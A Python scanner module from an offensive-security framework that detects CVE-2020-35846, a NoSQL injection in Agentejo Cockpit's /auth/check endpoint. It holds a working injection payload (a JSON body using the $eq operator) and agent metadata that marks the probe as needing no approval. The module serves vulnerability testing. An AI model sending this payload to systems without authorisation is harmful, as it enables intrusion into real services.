#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Agentejo Cockpit before 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Agentejo Cockpit < 0.11.2 - NoSQL Injection Detection',
        'description': 'Agentejo Cockpit before 0.11.2 allows NoSQL injection via the Controller/Auth.php check function. The $eq operator matches documents where the value of a field equals the specified value.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'nosqli', 'sqli', 'cockpit', 'injection', 'agentejo', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://swarm.ptsecurity.com/rce-cockpit-cms/',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-35846',
            'https://getcockpit.com/',
            'https://github.com/agentejo/cockpit/commit/2a385af8d80ed60d40d386ed813c1039db00c466',
            'https://github.com/agentejo/cockpit/commit/33e7199575631ba1f74cba6b16b10c820bec59af',
        ],
        'cve': 'CVE-2020-35846',
    }

    def run(self):
        path = '/auth/check'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{\n  "auth": {\n    "user": {\n      "$eq": "admin"\n    },\n    "password": [\n      0\n    ]\n  }\n}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('password_verify() expects parameter',)
        if any(m in body for m in body_any):
            self.set_info(
                severity='critical',
                reason='Agentejo Cockpit < 0.11.2 - NoSQL Injection detected',
                path=path,
            )
            return True
        return False

